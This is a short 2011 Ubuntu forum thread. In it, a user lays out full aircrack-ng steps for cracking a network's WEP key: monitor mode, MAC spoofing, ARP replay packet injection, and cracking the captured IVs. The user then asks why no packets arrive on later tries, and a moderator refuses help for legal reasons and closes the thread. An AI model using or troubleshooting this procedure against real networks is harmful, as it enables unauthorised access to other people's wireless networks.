---
title: "i need help with aircrack-ng"
date: 2011-07-11
forum: New to Ubuntu
---

### Post by aimmpact on 2011-07-11
im using Ubuntu and aircrack-ng 1.1 

this is my problem I did all this 


1. Open a new terminal
1.1 type in sudo -i
1.2 (If you have the tools, SKIP to 1.4) type in apt-get install airodump-ng
1.3 type in apt-get install macchanger
1.4 type in airmon-ng start wlan0
1.5 type in airodump-ng wlan0
1.6 find your network and remember the channel

2. new terminal and goto root with sudo -i
2.1 type in ifconfig wlan0 down
2.2 type in iwconfig wlan0 mode managed
2.3 type in ifconfig wlan0 up
2.4 type in iwconfig wlan0 channel "channel of network"
2.5 type in ifconfig wlan0 down
2.6 type in iwconfig wlan0 mode monitor
2.7 type in ifconfig wlan0 up

3. new terminal and goto root with sudo -i
3.1 type in airmon-ng stop wlan0
3.2 type in macchanger --mac "any fake mac (ex. 00:11:22:33:44:55)" wlan0
3.3 type in airmon-ng start wlan0

4. new terminal and goto root with sudo -i
4.1 type in airodump-ng wlan0
4.2 press ctrl+c to stop the scan when you see your network
4.3 remember the channel and the bssid

5. new terminal and goto root with sudo -i
5.1 type in airodump-ng -c "network channel (ex. 6)" -w "file name (ex. wep)" --bssid "your network's bssid" wlan0

6. new terminal and goto root with sudo -i
6.1 type in aireplay-ng -3 -b "network's bssid" -h "fake mac you put" wlan0

wait till #DATA is ATLEAST 12,000

7. ctrl+c to stop the aireplay and the airodump

8. new terminal and goto root with sudo -i
8.1 type in aircrack-ng --bssid "network's bssid" "file name"-01.cap

and it got about 5125 ivs and it said it failed and try 10000 ivs next time  


So i did the whole terminal commands and now I can't get no data. so it work the first time and now it can't get any data the second time or third time


please anyone have any idead why this is happening

---

### Post by uRock on 2011-07-11
We do not offer help with using aircrack-ng for legal reasons.

Thread Closed.

---

